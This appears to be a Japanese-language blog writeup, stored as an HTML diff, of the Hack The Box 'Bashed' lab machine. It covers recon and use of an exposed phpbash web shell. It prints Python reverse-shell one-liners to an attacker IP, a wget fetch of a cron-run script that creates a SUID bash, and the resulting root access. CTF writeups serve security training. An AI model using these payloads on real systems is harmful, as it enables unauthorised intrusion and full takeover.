@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="color-scheme" content="light dark">
+
+    
+
+    <meta name="author" content="cedric-ryo">
+    <meta name="description" content="HTB_Bashed_writeup">
+    <meta name="keywords" content="Security Enginner,English Beginner,CTF/Bug Bounty Beginner">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB_Bashed_writeup"/>
+<meta name="twitter:description" content="HTB_Bashed_writeup"/>
+
+    <meta property="og:title" content="HTB_Bashed_writeup" />
+<meta property="og:description" content="HTB_Bashed_writeup" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://example.org/posts/htb_bashed_writeup/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-07-02T16:19:22+09:00" />
+<meta property="article:modified_time" content="2022-07-02T16:19:22+09:00" />
+
+
+
+    <title>
+  HTB_Bashed_writeup · cedric-ryo.com
+</title>
+
+    
+      <link rel="canonical" href="http://example.org/posts/htb_bashed_writeup/">
+    
+
+    <link rel="preload" href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>
+
+    
+      
+      
+      <link rel="stylesheet" href="/css/coder.min.d9fddbffe6f27e69985dc5fe0471cdb0e57fbf4775714bc3d847accb08f4a1f6.css" integrity="sha256-2f3b/&#43;byfmmYXcX&#43;BHHNsOV/v0d1cUvD2Eesywj0ofY=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+    <link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+    <meta name="generator" content="Hugo 0.98.0" />
+  </head>
+
+  
+  
+  <body class="preload-transitions colorscheme-light">
+    
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      cedric-ryo.com
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/posts/">Blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://example.org/posts/htb_bashed_writeup/">
+              HTB_Bashed_writeup
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime="2022-07-02T16:19:22&#43;09:00">
+                July 2, 2022
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa fa-clock-o" aria-hidden="true"></i>
+              2-minute read
+            </span>
+          </div>
+          
+          
+          
+        </div>
+      </header>
+
+      <div>
+        
+        <h1 id="hack-the-box-bashed-writeup">
+  【Hack The Box】 Bashed Writeup
+  <a class="heading-link" href="#hack-the-box-bashed-writeup">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<h2 id="information">
+  Information
+  <a class="heading-link" href="#information">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<ul>
+<li>OS：Linux</li>
+<li>難易度：Easy</li>
+<li>IPアドレス：10.129.100.143<br>
+<figure class="center"><img src="/images/Bashed1.png" width="800"/><figcaption>
+            <h4>Screenshot</h4>
+        </figcaption>
+</figure>
+</li>
+</ul>
+<h2 id="recon">
+  Recon
+  <a class="heading-link" href="#recon">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<h3 id="autoreconでスキャンをし80が空いていることがわかります">
+  autoreconでスキャンをし、80が空いていることがわかります。
+  <a class="heading-link" href="#autorecon%e3%81%a7%e3%82%b9%e3%82%ad%e3%83%a3%e3%83%b3%e3%82%92%e3%81%9780%e3%81%8c%e7%a9%ba%e3%81%84%e3%81%a6%e3%81%84%e3%82%8b%e3%81%93%e3%81%a8%e3%81%8c%e3%82%8f%e3%81%8b%e3%82%8a%e3%81%be%e3%81%99">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>└─# python3 autorecon.py 10.129.100.143
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Scanning target 10.129.100.143
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>10.129.100.143/all-tcp-ports<span style="color:#f92672">]</span> Discovered open port tcp/80 on 10.129.100.143
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>10.129.100.143/tcp/80/http/vhost-enum<span style="color:#f92672">]</span> The target was not a hostname, nor was a hostname provided as an option. Skipping virtual host enumeration.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>10.129.100.143/tcp/80/http/known-security<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>tcp/80/http/known-security<span style="color:#f92672">]</span> There did not appear to be a .well-known/security.txt file in the webroot <span style="color:#f92672">(</span>/<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>10.129.100.143/tcp/80/http/curl-robots<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>tcp/80/http/curl-robots<span style="color:#f92672">]</span> There did not appear to be a robots.txt file in the webroot <span style="color:#f92672">(</span>/<span style="color:#f92672">)</span>.
+</span></span></code></pre></div><h3 id="ブラウザでアクセスします">
+  ブラウザでアクセスします。
+  <a class="heading-link" href="#%e3%83%96%e3%83%a9%e3%82%a6%e3%82%b6%e3%81%a7%e3%82%a2%e3%82%af%e3%82%bb%e3%82%b9%e3%81%97%e3%81%be%e3%81%99">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<figure class="center"><img src="/images/Bashed2.png" width="800"/><figcaption>
+            <h4>Screenshot</h4>
+        </figcaption>
+</figure>
+
+<h3 id="gobusterで探索をします">
+  gobusterで探索をします。
+  <a class="heading-link" href="#gobuster%e3%81%a7%e6%8e%a2%e7%b4%a2%e3%82%92%e3%81%97%e3%81%be%e3%81%99">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ gobuster dir -u http://10.129.100.143 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>Gobuster v3.1.0
+</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:                     http://10.129.100.143
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:                  GET
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:                 <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Negative Status codes:   <span style="color:#ae81ff">404</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:              gobuster/3.1.0
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:                 10s
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>2022/06/07 07:25:57 Starting gobuster in directory enumeration mode
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
+</span></span><span style="display:flex;"><span>/images               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 317<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.129.100.143/images/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/uploads              <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 318<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.129.100.143/uploads/<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>/php                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 314<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.129.100.143/php/<span style="color:#f92672">]</span>    
+</span></span><span style="display:flex;"><span>/css                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 314<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.129.100.143/css/<span style="color:#f92672">]</span>    
+</span></span><span style="display:flex;"><span>/dev                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 314<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.129.100.143/dev/<span style="color:#f92672">]</span>    
+</span></span><span style="display:flex;"><span>/js                   <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 313<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.129.100.143/js/<span style="color:#f92672">]</span>     
+</span></span><span style="display:flex;"><span>/fonts                <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 316<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.129.100.143/fonts/<span style="color:#f92672">]</span>
+</span></span></code></pre></div><h3 id="devにアクセスするとディレクトリリスティングされています">
+  /devにアクセスすると、ディレクトリリスティングされています。
+  <a class="heading-link" href="#dev%e3%81%ab%e3%82%a2%e3%82%af%e3%82%bb%e3%82%b9%e3%81%99%e3%82%8b%e3%81%a8%e3%83%87%e3%82%a3%e3%83%ac%e3%82%af%e3%83%88%e3%83%aa%e3%83%aa%e3%82%b9%e3%83%86%e3%82%a3%e3%83%b3%e3%82%b0%e3%81%95%e3%82%8c%e3%81%a6%e3%81%84%e3%81%be%e3%81%99">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<figure class="center"><img src="/images/Bashed3.png" width="800"/><figcaption>
+            <h4>Screenshot</h4>
+        </figcaption>
+</figure>
+
+<h3 id="phpbashphpをクリックするとシェルのようなプロンプトにアクセスできました">
+  phpbash.phpをクリックすると、シェルのようなプロンプトにアクセスできました。
+  <a class="heading-link" href="#phpbashphp%e3%82%92%e3%82%af%e3%83%aa%e3%83%83%e3%82%af%e3%81%99%e3%82%8b%e3%81%a8%e3%82%b7%e3%82%a7%e3%83%ab%e3%81%ae%e3%82%88%e3%81%86%e3%81%aa%e3%83%97%e3%83%ad%e3%83%b3%e3%83%97%e3%83%88%e3%81%ab%e3%82%a2%e3%82%af%e3%82%bb%e3%82%b9%e3%81%a7%e3%81%8d%e3%81%be%e3%81%97%e3%81%9f">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<figure class="center"><img src="/images/Bashed4.png" width="800"/><figcaption>
+            <h4>Screenshot</h4>
+        </figcaption>
+</figure>
+
+<h3 id="ncからシェルに繋ぎますpythonコードをターゲットマシンのプロンプトに入力します">
+  ncからシェルに繋ぎます。pythonコードをターゲットマシンのプロンプトに入力します。
+  <a class="heading-link" href="#nc%e3%81%8b%e3%82%89%e3%82%b7%e3%82%a7%e3%83%ab%e3%81%ab%e7%b9%8b%e3%81%8e%e3%81%be%e3%81%99python%e3%82%b3%e3%83%bc%e3%83%89%e3%82%92%e3%82%bf%e3%83%bc%e3%82%b2%e3%83%83%e3%83%88%e3%83%9e%e3%82%b7%e3%83%b3%e3%81%ae%e3%83%97%e3%83%ad%e3%83%b3%e3%83%97%e3%83%88%e3%81%ab%e5%85%a5%e5%8a%9b%e3%81%97%e3%81%be%e3%81%99">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc -lnvp <span style="color:#ae81ff">4444</span> 
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>python -c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.114&#34;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;])&#39;</span>
+</span></span></code></pre></div><h3 id="シェルが返ってきましたのでフラグを取りますフラグは省略しています">
+  シェルが返ってきましたので、フラグを取ります。（フラグは省略しています）
+  <a class="heading-link" href="#%e3%82%b7%e3%82%a7%e3%83%ab%e3%81%8c%e8%bf%94%e3%81%a3%e3%81%a6%e3%81%8d%e3%81%be%e3%81%97%e3%81%9f%e3%81%ae%e3%81%a7%e3%83%95%e3%83%a9%e3%82%b0%e3%82%92%e5%8f%96%e3%82%8a%e3%81%be%e3%81%99%e3%83%95%e3%83%a9%e3%82%b0%e3%81%af%e7%9c%81%e7%95%a5%e3%81%97%e3%81%a6%e3%81%84%e3%81%be%e3%81%99">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc -lnvp <span style="color:#ae81ff">4444</span> 
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.114<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.100.143<span style="color:#f92672">]</span> <span style="color:#ae81ff">48662</span>
+</span></span><span style="display:flex;"><span>/bin/sh: 0: can<span style="color:#960050;background-color:#1e0010">&#39;</span>t access tty; job control turned off
+</span></span><span style="display:flex;"><span>$
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat user.txt
+</span></span><span style="display:flex;"><span>2c2...
+</span></span></code></pre></div><h2 id="権限昇格">
+  権限昇格
+  <a class="heading-link" href="#%e6%a8%a9%e9%99%90%e6%98%87%e6%a0%bc">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<h3 id="sudo--lでパスワード不要でsudoできるコマンドのリストを表示しますscriptmanagerは全てのコマンドをsudoのパスワードなしで実行できます">
+  sudo -lでパスワード不要でsudoできるコマンドのリストを表示します。scriptmanagerは全てのコマンドをsudoのパスワードなしで実行できます。
+  <a class="heading-link" href="#sudo--l%e3%81%a7%e3%83%91%e3%82%b9%e3%83%af%e3%83%bc%e3%83%89%e4%b8%8d%e8%a6%81%e3%81%a7sudo%e3%81%a7%e3%81%8d%e3%82%8b%e3%82%b3%e3%83%9e%e3%83%b3%e3%83%89%e3%81%ae%e3%83%aa%e3%82%b9%e3%83%88%e3%82%92%e8%a1%a8%e7%a4%ba%e3%81%97%e3%81%be%e3%81%99scriptmanager%e3%81%af%e5%85%a8%e3%81%a6%e3%81%ae%e3%82%b3%e3%83%9e%e3%83%b3%e3%83%89%e3%82%92sudo%e3%81%ae%e3%83%91%e3%82%b9%e3%83%af%e3%83%bc%e3%83%89%e3%81%aa%e3%81%97%e3%81%a7%e5%ae%9f%e8%a1%8c%e3%81%a7%e3%81%8d%e3%81%be%e3%81%99">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo -l
+</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> www-data on bashed:
+</span></span><span style="display:flex;"><span>    env_reset, mail_badpass,
+</span></span><span style="display:flex;"><span>    secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>User www-data may run the following commands on bashed:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>scriptmanager : scriptmanager<span style="color:#f92672">)</span> NOPASSWD: ALL
+</span></span></code></pre></div><h3 id="以前に使用したものと同じpythonリバースシェルをscriptmanagerとして再度使用します">
+  以前に使用したものと同じPythonリバースシェルを、scriptmanagerとして再度使用します。
+  <a class="heading-link" href="#%e4%bb%a5%e5%89%8d%e3%81%ab%e4%bd%bf%e7%94%a8%e3%81%97%e3%81%9f%e3%82%82%e3%81%ae%e3%81%a8%e5%90%8c%e3%81%98python%e3%83%aa%e3%83%90%e3%83%bc%e3%82%b9%e3%82%b7%e3%82%a7%e3%83%ab%e3%82%92scriptmanager%e3%81%a8%e3%81%97%e3%81%a6%e5%86%8d%e5%ba%a6%e4%bd%bf%e7%94%a8%e3%81%97%e3%81%be%e3%81%99">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc -lnvp <span style="color:#ae81ff">4445</span> 
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4445</span> ...
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo -u scriptmanager python -c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.114&#34;,4445));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;])&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc -lnvp <span style="color:#ae81ff">4445</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4445</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.114<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.100.143<span style="color:#f92672">]</span> <span style="color:#ae81ff">45882</span>
+</span></span><span style="display:flex;"><span>/bin/sh: 0: can<span style="color:#960050;background-color:#1e0010">&#39;</span>t access tty; job control turned off
+</span></span><span style="display:flex;"><span>$ whoami
+</span></span><span style="display:flex;"><span>scriptmanager
+</span></span></code></pre></div><h3 id="scriptmanagerが所有するファイルとフォルダーを列挙しますscriptstestpyがありました">
+  scriptmanagerが所有するファイルとフォルダーを列挙します。/scripts/test.pyがありました。
+  <a class="heading-link" href="#scriptmanager%e3%81%8c%e6%89%80%e6%9c%89%e3%81%99%e3%82%8b%e3%83%95%e3%82%a1%e3%82%a4%e3%83%ab%e3%81%a8%e3%83%95%e3%82%a9%e3%83%ab%e3%83%80%e3%83%bc%e3%82%92%e5%88%97%e6%8c%99%e3%81%97%e3%81%be%e3%81%99scriptstestpy%e3%81%8c%e3%81%82%e3%82%8a%e3%81%be%e3%81%97%e3%81%9f">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ find / -xdev -type f -user scriptmanager 2&gt;/dev/null; find -xdev -type d -user scriptmanager 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/scripts/test.py
+</span></span><span style="display:flex;"><span>/home/scriptmanager/.profile
+</span></span><span style="display:flex;"><span>/home/scriptmanager/.bashrc
+</span></span><span style="display:flex;"><span>/home/scriptmanager/.bash_history
+</span></span><span style="display:flex;"><span>/home/scriptmanager/.bash_logout
+</span></span></code></pre></div><h3 id="scriptstestpyの中身を見てみるとテキストファイルに文字列を書き込んでいるだけです">
+  /scripts/test.pyの中身を見てみると、テキストファイルに文字列を書き込んでいるだけです。
+  <a class="heading-link" href="#scriptstestpy%e3%81%ae%e4%b8%ad%e8%ba%ab%e3%82%92%e8%a6%8b%e3%81%a6%e3%81%bf%e3%82%8b%e3%81%a8%e3%83%86%e3%82%ad%e3%82%b9%e3%83%88%e3%83%95%e3%82%a1%e3%82%a4%e3%83%ab%e3%81%ab%e6%96%87%e5%ad%97%e5%88%97%e3%82%92%e6%9b%b8%e3%81%8d%e8%be%bc%e3%82%93%e3%81%a7%e3%81%84%e3%82%8b%e3%81%a0%e3%81%91%e3%81%a7%e3%81%99">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat /scripts/test.py
+</span></span><span style="display:flex;"><span>f <span style="color:#f92672">=</span> open<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;test.txt&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>f.write<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;testing 123!&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>f.close
+</span></span></code></pre></div><h3 id="bashのsuidバイナリを作成するpythonスクリプトをローカルで作成します">
+  bashのSUIDバイナリを作成するPythonスクリプトをローカルで作成します。
+  <a class="heading-link" href="#bash%e3%81%aesuid%e3%83%90%e3%82%a4%e3%83%8a%e3%83%aa%e3%82%92%e4%bd%9c%e6%88%90%e3%81%99%e3%82%8bpython%e3%82%b9%e3%82%af%e3%83%aa%e3%83%97%e3%83%88%e3%82%92%e3%83%ad%e3%83%bc%e3%82%ab%e3%83%ab%e3%81%a7%e4%bd%9c%e6%88%90%e3%81%97%e3%81%be%e3%81%99">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat test.py                
+</span></span><span style="display:flex;"><span>import os
+</span></span><span style="display:flex;"><span>os.system<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;cp /bin/bash /tmp/stef; chmod +s /tmp/stef&#39;</span><span style="color:#f92672">)</span>
+</span></span></code></pre></div><h3 id="httpサーバをサーブしタッゲートマシンに転送します">
+  HTTPサーバをサーブし、タッゲートマシンに転送します。
+  <a class="heading-link" href="#http%e3%82%b5%e3%83%bc%e3%83%90%e3%82%92%e3%82%b5%e3%83%bc%e3%83%96%e3%81%97%e3%82%bf%e3%83%83%e3%82%b2%e3%83%bc%e3%83%88%e3%83%9e%e3%82%b7%e3%83%b3%e3%81%ab%e8%bb%a2%e9%80%81%e3%81%97%e3%81%be%e3%81%99">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cd /scripts                                
+</span></span><span style="display:flex;"><span>$ ls
+</span></span><span style="display:flex;"><span>test.py
+</span></span><span style="display:flex;"><span>test.txt
+</span></span><span style="display:flex;"><span>$ wget http://10.10.14.114/test.py -O test.py
+</span></span><span style="display:flex;"><span>--2022-06-07 05:16:34--  http://10.10.14.114/test.py
+</span></span><span style="display:flex;"><span>Connecting to 10.10.14.114:80... connected.
+</span></span><span style="display:flex;"><span>HTTP request sent, awaiting response... <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Length: <span style="color:#ae81ff">66</span> <span style="color:#f92672">[</span>text/plain<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Saving to: <span style="color:#e6db74">&#39;test.py&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>     0K                                                       100% 8.28M<span style="color:#f92672">=</span>0s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2022-06-07 05:16:35 <span style="color:#f92672">(</span>8.28 MB/s<span style="color:#f92672">)</span> - <span style="color:#e6db74">&#39;test.py&#39;</span> saved <span style="color:#f92672">[</span>66/66<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ cat test.py
+</span></span><span style="display:flex;"><span>import os
+</span></span><span style="display:flex;"><span>os.system<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;cp /bin/bash /tmp/stef; chmod +s /tmp/stef&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>$
+</span></span></code></pre></div><h3 id="数分待ちtmpstef--pを実行するとrootが取れましたのでフラグを取得しますフラグは省略しています">
+  数分待ち、/tmp/stef -pを実行するとrootが取れましたので、フラグを取得します。（フラグは省略しています）
+  <a class="heading-link" href="#%e6%95%b0%e5%88%86%e5%be%85%e3%81%a1tmpstef--p%e3%82%92%e5%ae%9f%e8%a1%8c%e3%81%99%e3%82%8b%e3%81%a8root%e3%81%8c%e5%8f%96%e3%82%8c%e3%81%be%e3%81%97%e3%81%9f%e3%81%ae%e3%81%a7%e3%83%95%e3%83%a9%e3%82%b0%e3%82%92%e5%8f%96%e5%be%97%e3%81%97%e3%81%be%e3%81%99%e3%83%95%e3%83%a9%e3%82%b0%e3%81%af%e7%9c%81%e7%95%a5%e3%81%97%e3%81%a6%e3%81%84%e3%81%be%e3%81%99">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ /tmp/stef -p
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>cat root.txt
+</span></span><span style="display:flex;"><span>cc4...
+</span></span></code></pre></div>
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+      </div>
+
+      <footer class="footer">
+  <section class="container">
+    ©
+    
+    2022
+     cedric-ryo 
+    ·
+    
+    Powered by <a href="https://gohugo.io/">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/">Coder</a>.
+    
+  </section>
+</footer>
+
